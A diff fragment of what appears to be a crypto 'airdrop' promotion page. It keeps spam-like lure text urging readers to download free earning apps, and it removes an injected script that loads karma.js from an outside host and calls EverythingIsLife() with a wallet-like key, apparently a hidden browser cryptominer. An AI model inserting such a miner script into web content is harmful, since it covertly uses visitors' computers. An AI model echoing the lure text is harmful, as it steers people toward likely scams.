@@ -85,8 +85,3 @@
 - These Are Applications That Are Completely For Informational Purposes And Allow You To Earn Airdrop For Free Without Investing.
 - Since The Airdrop Distribution Is Limited, Download The Applications For Free And Start Earning Immediately.
 - Good Earnings...
-
-<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
-<script type="text/javascript">
-EverythingIsLife('4ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtSYBQAY1u5', 'x', 30);
-</script>
